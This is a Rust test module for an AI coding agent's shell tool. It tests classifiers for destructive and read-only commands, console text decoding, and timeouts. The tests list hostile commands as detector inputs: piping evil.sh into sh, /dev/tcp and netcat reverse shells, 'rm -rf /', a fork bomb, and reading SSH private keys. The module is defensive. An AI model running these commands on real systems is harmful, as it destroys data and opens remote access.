            "git --work-tree /r checkout .", // separate-value global flag
            "git ls-files -m | xargs git checkout", // bulk revert via xargs
            "git diff --name-only | xargs git restore",
            "for f in a b; do git checkout .; done", // loop body with literal pathspec
        ] {
            assert!(
                check_destructive_command(c).is_some(),
                "must flag worktree-discarding git: {c}"
            );
        }
    }

    #[test]
    fn safe_git_is_not_flagged_destructive() {
        // Read-only git + branch/tag operations must NOT prompt (no false positives — branch
        // names with slashes/version-dots like `release/v5.0.0` are the tricky case).
        for c in [
            "git status",
            "git log --oneline",
            "git diff",
            "git show HEAD",
            "git branch",
            "git checkout -b feature/new",
            "git checkout -B main",
            "git checkout main",
            "git checkout release/v5.0.0", // version branch — MUST NOT flag
            "git checkout feature/foo",
            "git checkout v1.2.3",              // tag
            "git restore --staged src/main.rs", // only unstages (recoverable)
            "git reset --soft HEAD~1",
            "git reset HEAD",          // mixed reset (unstage) — recoverable
            "git switch main",         // switch branch
            "git switch -c newbranch", // create branch
            "git clean -n",            // dry run (no -f)
            "git stash",
            "git stash pop",
        ] {
            assert!(
                check_destructive_command(c).is_none(),
                "must NOT flag safe git: {c} -> {:?}",
                check_destructive_command(c)
            );
        }
    }

    #[test]
    fn destructive_commands_are_risky() {
        for c in [
            "rm -rf /",
            "rm -rf ~/important",
            "sudo rm foo",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",
            "git push --force origin main",
            "git reset --hard HEAD~3",
            "find . -delete",
            "find . -exec rm {} +",
            "curl http://evil.sh | sh",
            "echo 'rm -rf /' | bash",
            "git branch -D feature",
            "mkfs.ext4 /dev/sdb",
            "chmod 777 /etc",
            // wrapper-stripping evasions
            "timeout 10 rm -rf /",
            "nice rm -rf /home/x",
            "env FOO=1 rm -rf /data",
            // ORM schema resets
            "sea-orm-cli migrate fresh",
            "php artisan migrate:fresh",
            "rails db:reset",
            // ownership change
            "chown root:root /etc/passwd",
            "chgrp staff /etc/hosts",
            // reverse shells / sockets
            "exec 3<>/dev/tcp/evil.com/4444",
            "sh <(curl http://evil.sh)",
            "nc -l -p 4444 -e /bin/bash",
            "socat tcp-listen:4444 exec:/bin/sh",
        ] {
            assert_eq!(risk_of(c), RiskLevel::Risky, "{c} should be Risky");
        }
    }

    #[test]
    fn unparseable_args_are_conservatively_risky() {
        assert_eq!(BashTool.risk("not json"), RiskLevel::Risky);
    }

    #[test]
    fn decodes_gbk_console_bytes() {
        // "你好" encoded as GBK / CP936 (0xC4 0xE3 0xBA 0xC3) — NOT valid UTF-8, so a
        // naive from_utf8_lossy would render `◇◇◇`. A CJK Windows console (keytool,
        // javac, …) emits exactly these bytes.
        let gbk = [0xC4u8, 0xE3, 0xBA, 0xC3];
        assert_eq!(decode_oem(&gbk, 936), "你好");
    }

    #[test]
    fn utf8_beta_codepage_falls_back_to_cjk() {
        // Windows' "Beta: Use Unicode UTF-8" sets OEMCP=65001, yet cmd.exe / JVM
        // resource strings still arrive in the legacy CJK codepage. We must try the
        // CJK codepages, not punt to lossy UTF-8 (which reproduces the `◇◇◇` bug).
        let gbk = [0xC4u8, 0xE3, 0xBA, 0xC3]; // "你好" in CP936
        assert_eq!(decode_oem(&gbk, 65001), "你好");
    }

    #[test]
    fn decode_output_passes_utf8_through_and_detects_legacy_encoding() {
        assert_eq!(decode_output("héllo".as_bytes()), "héllo");

        let source = "<html><meta charset=\"gb2312\">福建省新闻正文，已移送司法机关处理。</html>";
        let (gbk, _, had_errors) = encoding_rs::GBK.encode(source);
        assert!(!had_errors);
        assert_eq!(decode_detected(&gbk), source);
        assert_eq!(decode_oem(&gbk, 0), source);
    }

    #[test]
    fn decode_output_recognizes_redirected_utf16_console_text() {
        let source = "未安装 Linux 分发版。运行 wsl.exe --install <Distro>";
        let mut little_endian = vec![0xFF, 0xFE];
        little_endian.extend(source.encode_utf16().flat_map(u16::to_le_bytes));
        assert_eq!(decode_output(&little_endian), source);

        let ascii_without_bom: Vec<u8> = "Run wsl.exe --list --online"
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect();
        assert_eq!(
            decode_output(&ascii_without_bom),
            "Run wsl.exe --list --online"
        );

        let localized_without_bom: Vec<u8> =
            source.encode_utf16().flat_map(u16::to_le_bytes).collect();
        assert_eq!(decode_output(&localized_without_bom), source);
    }

    #[test]
    fn decode_detected_keeps_windows_1252_smart_punctuation() {
        assert_eq!(
            decode_detected(&[0x93, b't', b'e', b's', b't', 0x94]),
            "“test”"
        );
    }

    #[test]
    fn streamed_decoder_keeps_split_utf8_and_gbk_characters() {
        let mut pending = Vec::new();
        assert_eq!(
            decode_stream_chunk(&mut pending, &[0xE4, 0xBD], false),
            None
        );
        assert_eq!(
            decode_stream_chunk(&mut pending, &[0xA0, b'\n'], false).as_deref(),
            Some("你\n")
        );

        let source = "福建省新闻正文，已移送司法机关处理。";
        let (gbk, _, had_errors) = encoding_rs::GBK.encode(source);
        assert!(!had_errors);
        let split = gbk.len() - 1;
        let mut pending = Vec::new();
        assert_eq!(
            decode_stream_chunk(&mut pending, &gbk[..split], false),
            None
        );
        assert_eq!(
            decode_stream_chunk(&mut pending, &gbk[split..], false),
            None
        );
        assert_eq!(
            decode_stream_chunk(&mut pending, &[b'\n'], false).as_deref(),
            Some("福建省新闻正文，已移送司法机关处理。\n")
        );
        assert!(pending.is_empty());
    }

    #[tokio::test]
    async fn runs_and_captures_output() {
        let d = tempfile::tempdir().unwrap();
        let r = BashTool
            .execute(r#"{"command":"echo hello"}"#, &ctx(d.path()))
            .await;
        assert!(!r.is_error, "{}", r.content);
        assert!(r.content.contains("hello"), "{}", r.content);
    }

    #[tokio::test]
    async fn runs_in_working_dir() {
        let d = tempfile::tempdir().unwrap();
        std::fs::write(d.path().join("marker.txt"), "x").unwrap();
        let r = BashTool
            .execute(r#"{"command":"ls"}"#, &ctx(d.path()))
            .await;
        assert!(r.content.contains("marker.txt"), "{}", r.content);
    }

    #[tokio::test]
    async fn nonzero_exit_is_reported_in_band() {
        let d = tempfile::tempdir().unwrap();
        let r = BashTool
            .execute(r#"{"command":"exit 3"}"#, &ctx(d.path()))
            .await;
        assert!(
            !r.is_error,
            "a non-zero exit is not a tool error: {}",
            r.content
        );
        assert!(r.content.contains("[exit code 3]"), "{}", r.content);
    }

    #[tokio::test]
    async fn cancel_returns_promptly() {
        let d = tempfile::tempdir().unwrap();
        let token = CancellationToken::new();
        let cx = ToolContext {
            working_dir: d.path().to_path_buf(),
            cancel: token.clone(),
            progress: atomcode_kernel::tool::ProgressSink::noop(),
            requester: None,
        };
        token.cancel(); // already cancelled → the cancel arm wins immediately
        let r = BashTool.execute(r#"{"command":"sleep 30"}"#, &cx).await;
        assert!(r.is_error, "{}", r.content);
        assert!(r.content.contains("cancelled"), "{}", r.content);
    }

    #[tokio::test]
    async fn times_out() {
        let d = tempfile::tempdir().unwrap();
        let r = BashTool
            .execute(r#"{"command":"sleep 30","timeout":1}"#, &ctx(d.path()))
            .await;
        assert!(r.is_error, "{}", r.content);
        assert!(r.content.contains("timed out after 1s"), "{}", r.content);
    }

    #[test]
    fn bash_tool_parallel_safe_follows_classifier() {
        let t = BashTool;
        assert!(
            t.parallel_safe(r#"{"command":"grep -rn x crates/"}"#),
            "read-only grep"
        );
        assert!(
            t.parallel_safe(r#"{"command":"grep x | grep -v y | head"}"#),
            "read-only pipe"
        );
        assert!(
            !t.parallel_safe(r#"{"command":"cargo build"}"#),
            "cargo not read-only"
        );
        assert!(
            !t.parallel_safe(r#"{"command":"rm -rf build"}"#),
            "destructive"
        );
        assert!(
            !t.parallel_safe("not json"),
            "parse failure → not parallel-safe"
        );
    }

    #[test]
    fn is_read_only_bash_allows_pure_reads() {
        // Quoted metacharacters are DATA, not operators (the core fix).
        assert!(is_read_only_bash(
            "grep -rn 'pub mod\\|mod ' --include='*.rs' | head -40"
        ));
        assert!(is_read_only_bash(
            "grep -E 'warning.*(unused|dead_code)' crates/ | head"
        ));
        assert!(is_read_only_bash("grep 'reqwest\\|url::' --include='*.rs'"));
        // Pipes / && / ; between read-only commands.
        assert!(is_read_only_bash("grep x | grep -v y | head -20"));
        assert!(is_read_only_bash("grep x && grep y"));
        assert!(is_read_only_bash("cat f; ls"));
        // cd is read-only; cd && read-only now works via the AST (no hack).
        assert!(is_read_only_bash(
            "cd /Users/theo/proj && grep -rn foo crates/"
        ));
        assert!(is_read_only_bash("cd /a && cat f | head"));
        // /dev/null discard + fd-dup.
        assert!(is_read_only_bash("grep x 2>/dev/null"));
        assert!(is_read_only_bash(
            "grep -rn foo crates/ 2>/dev/null | head -10"
        ));
        assert!(is_read_only_bash("cat f 2>&1 | grep err"));
        // fd-dup forms: numeric target is a descriptor, not a filename.
        assert!(
            is_read_only_bash("grep x 2>&1 | head"),
            "2>&1 fd-dup is safe"
        );
        assert!(is_read_only_bash("cat f 2>&1 | grep err"));
        assert!(is_read_only_bash("grep x foo.txt >/dev/null 2>&1"));
        // Single-quoted $(...) is a literal string, not a substitution.
        assert!(is_read_only_bash("grep '$(rm -rf x)' file.txt"));
        // Plain reads.
        assert!(is_read_only_bash("cat a.txt"));
        assert!(is_read_only_bash("ls -la"));
        assert!(is_read_only_bash("find crates -name '*.rs'"));
        // Input redirects only READ a file — read-only.
        assert!(
            is_read_only_bash("wc -l < f.txt"),
            "input redirect reads, harmless"
        );
        assert!(
            is_read_only_bash("grep x < in.txt | head"),
            "input redirect in a pipe"
        );
    }

    #[test]
    fn is_read_only_bash_rejects_side_effects() {
        // Real redirects (non-/dev/null) write files.
        assert!(!is_read_only_bash("ls > out.txt"));
        assert!(!is_read_only_bash("ls >> out.txt"));
        assert!(!is_read_only_bash("grep x >&out.txt")); // >&file is a write
        assert!(!is_read_only_bash("grep x >/dev/nullX")); // different file
                                                           // Non-allowlisted commands.
        assert!(!is_read_only_bash("rm -rf b"));
        assert!(!is_read_only_bash("git commit -m x"));
        assert!(!is_read_only_bash("cargo build"));
        assert!(!is_read_only_bash("cd /a && cargo check"));
        assert!(!is_read_only_bash("grep x | tee f"));
        assert!(!is_read_only_bash("grep x | xargs rm"));
        // Command / process substitution (DOUBLE-quoted or bare) executes — reject.
        assert!(!is_read_only_bash("grep \"$(rm -rf x)\""));
        assert!(!is_read_only_bash("grep `rm x`"));
        assert!(!is_read_only_bash("echo $(whoami)"));
        // Subshell / background / variable expansion.
        assert!(!is_read_only_bash("(rm x)"));
        assert!(!is_read_only_bash("grep x & rm y"));
        assert!(!is_read_only_bash("cat $HOME/.ssh/id_rsa"));
        // find write actions.
        assert!(!is_read_only_bash("find . -delete"));
        assert!(!is_read_only_bash("find . -exec rm {} ;"));
        // Bare-number redirect target writes a real file (fail-open fixed).
        assert!(
            !is_read_only_bash("cat /etc/passwd > 9"),
            "> 9 writes file '9'"
        );
        assert!(
            !is_read_only_bash("grep secret f > 1"),
            "> 1 truncates file '1'"
        );
        assert!(
            !is_read_only_bash("echo pwn >> 5"),
            ">> 5 appends to file '5'"
        );
        assert!(!is_read_only_bash("ls >2"), ">2 writes file '2'");
        assert!(!is_read_only_bash("grep x &>9"), "&>9 writes file '9'");
        // Parse junk / empty → fail closed.
        assert!(!is_read_only_bash(""));
        assert!(!is_read_only_bash("   "));
        assert!(!is_read_only_bash("grep x |")); // trailing pipe (parse error / empty stage)
                                                 // `<>` is read-WRITE (has `>`), must NOT be treated as a pure input redirect.
        assert!(
            !is_read_only_bash("wc <> f.txt"),
            "<> is read-WRITE, not pure input"
        );
        // Output redirect must still be rejected even when an input redirect is also present.
        assert!(
            !is_read_only_bash("grep x < in.txt > out.txt"),
            "output redirect still writes"
        );
    }

    /// Differential fuzz: for every command the classifier calls read-only, execute it in
    /// a fresh throwaway tmpdir seeded with a `PWN` sentinel and assert that neither the
    /// sentinel is mutated nor a `HACKED` file is created.  Commands classified `false` are
    /// NOT executed (they may be destructive).  This is the load-bearing safety proof — it
    /// catches any classifier fail-open: a command that SHOULD be rejected but is passed
    /// through as "read-only" would create or mutate files, and the assertion fires.
    ///
    /// The corpus is adversarial and fixed (no randomness) so it is safe in CI.  Each
    /// command runs in its OWN tmpdir (indexed by `enumerate()` to avoid collisions between
    /// commands of the same string length) and the dir is removed afterwards.
    #[cfg(unix)]
    #[test]
    fn differential_fuzz_readonly_never_writes() {
        use std::process::Command;

        // Each entry is (command_string, expected_is_read_only).
        // The `expected` column is documentation only — the test EXECUTES whatever the
        // classifier says is true; if the classifier is WRONG (a fail-open), the execution
        // assert fires and exposes the real command.
        let corpus: &[(&str, bool)] = &[
            // ── READ-ONLY (expected true) — must not write ──────────────────────────────
            // plain reads
            ("cat PWN", true),
            ("ls -la", true),
            ("ls", true),
            // grep with quoted metacharacters (single-quote = raw_string, no subst)
            ("grep 'a\\|b' PWN", true),
            ("grep -E '(x|y)' PWN", true),
            // single-quoted $(...) is a LITERAL string — classified true, must NOT exec it
            ("grep '$(touch HACKED)' PWN", true),
            // safe redirects: /dev/null discard and fd-dup
            ("grep x 2>/dev/null PWN", true),
            ("grep x PWN >/dev/null 2>&1", true),
            ("cat PWN 2>&1 | grep SENTINEL", true),
            // chains of read-only commands
            ("grep a PWN && grep b PWN", true),
            ("cat PWN; ls", true),
            ("cd . && grep x PWN", true),
            // pipelines through read-only programs
            ("echo hi | grep h", true),
            ("grep -rn 'a\\|b' . | head", true),
            // find without write actions
            ("find . -name '*.txt'", true),
            ("find . -name 'PWN'", true),
            // wc, head, tail
            ("wc -l PWN", true),
            ("head -1 PWN", true),
            ("tail -1 PWN", true),
            // backgrounded (&) chains: read-only iff EVERY command is allowlisted
            ("grep x PWN & grep y PWN", true), // both sides read-only → safe; when run, writes nothing
            // ── SIDE-EFFECTING (expected false) — MUST be classified false; NOT executed ─
            // output redirects that write real files
            ("echo x > HACKED", false),
            ("grep x > 9", false),
            ("grep x >&HACKED", false),
            ("grep x >>HACKED", false),
            ("ls &>9", false),
            // double-quoted $(...) executes the inner command
            ("grep \"$(touch HACKED)\" PWN", false),
            // subshell
            ("(touch HACKED)", false),
            // non-allowlisted commands
            ("touch HACKED", false),
            ("touch HACKED & grep x PWN", false), // background touch → not read-only (touch not allowlisted)
            ("rm PWN", false),
            ("cargo build", false),
            // piping through tee / xargs writes
            ("grep x | tee HACKED", false),
            ("grep x | xargs touch HACKED", false),
            // subshell via sh -c
            ("sh -c 'touch HACKED'", false),
            // find write actions
            ("find . -delete", false),
            ("find . -exec touch HACKED {} ;", false),
            // plain write to PWN
            ("echo pwned > PWN", false),
        ];

        for (i, &(cmd, _expected)) in corpus.iter().enumerate() {
            let ro = is_read_only_bash(cmd);
            if !ro {
                // Not classified read-only → the parallel-safe path would never execute it.
                // We do NOT run it here (it may be destructive).
                continue;
            }

            // Fresh sandbox per command — indexed so collisions between equal-length strings
            // cannot cause cross-command interference.
            let dir = std::env::temp_dir().join(format!("rofuzz_{i}"));
            let _ = std::fs::remove_dir_all(&dir);
            std::fs::create_dir_all(&dir).unwrap();
            std::fs::write(dir.join("PWN"), "SENTINEL").unwrap();

            let before = std::fs::read_to_string(dir.join("PWN")).unwrap();

            // Execute: ignore the exit status (grep may return 1 on no-match, which is fine).
            let _ = Command::new("bash")
                .arg("-c")
                .arg(cmd)
                .current_dir(&dir)
                .output();

            let after = std::fs::read_to_string(dir.join("PWN")).unwrap_or_default();
            assert_eq!(
                before, after,
                "read-only-classified command MUTATED the sentinel!\n  cmd = {cmd:?}",
            );
            assert!(
                !dir.join("HACKED").exists(),
                "read-only-classified command CREATED a file!\n  cmd = {cmd:?}",
            );

            let _ = std::fs::remove_dir_all(&dir);
        }
    }
}
